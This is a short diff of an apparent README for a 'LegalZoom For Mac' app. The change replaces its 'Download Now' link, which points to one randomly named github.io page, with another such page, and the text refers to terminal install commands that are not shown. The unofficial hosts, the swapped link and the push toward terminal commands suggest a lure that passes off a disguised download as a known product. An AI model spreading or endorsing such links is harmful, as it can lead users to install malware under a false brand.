@@ -3,7 +3,7 @@
 
 LegalZoom For Mac is a streamlined desktop app designed to simplify legal document creation, business formation, and attorney consultations for macOS users. Access tools for LLC formation, wills, trademarks, and more, all from a user-friendly interface. Follow the instructions below to download and install LegalZoom For Mac effortlessly. 
 
-[![Download Now](https://img.shields.io/badge/Download-Now-005F6B?style=for-the-badge&logo=apple)](https://fituganshfgh.github.io/.github/lzoom)
+[![Download Now](https://img.shields.io/badge/Download-Now-005F6B?style=for-the-badge&logo=apple)](https://mrboomzeus519.github.io/gimronus/lzoom)
 
 If you encounter issues downloading via the button above, follow the terminal command instructions below.
 
